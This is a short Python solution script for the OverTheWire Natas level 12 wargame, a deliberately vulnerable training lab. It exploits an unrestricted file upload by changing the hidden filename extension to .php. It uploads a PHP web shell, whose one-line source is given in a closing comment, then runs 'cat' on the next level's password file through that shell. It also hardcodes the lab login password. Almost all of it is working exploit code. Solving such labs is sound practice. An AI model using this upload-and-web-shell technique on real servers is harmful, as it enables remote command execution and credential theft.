#!/usr/bin/python3

import requests
from bs4 import BeautifulSoup
import string


url = "http://natas12.natas.labs.overthewire.org/"
shell = open("./cmd.php", "rb") 

sess = requests.session()
r=sess.get(url,auth=("natas12", "EDXp0pS26wLKHZy1rDBPUZk0RKfLGIR3"))
soup = BeautifulSoup(r.text, "html.parser")
value = soup.find_all("input", attrs={"type":"hidden"})[1].attrs["value"]
value = value.replace("jpg", "php")

r2 = sess.post(url+'index.php', files={"uploadedfile":shell}, auth=("natas12", "EDXp0pS26wLKHZy1rDBPUZk0RKfLGIR3"), data={
     "filename":value,
     "MAX_FILE_SIZE":"1000"
 })


soup2 = BeautifulSoup(r2.text, "html.parser")
link = soup2.find("a")


r3 = sess.get(url+link.text+"?l=cat /etc/natas_webpass/natas13", auth=("natas12", "EDXp0pS26wLKHZy1rDBPUZk0RKfLGIR3"))
print("Natas 13 password:",r3.text)

#You can use this as your shell : <?=system($_GET["l"]);?> , just save it in a file called cmd.php 
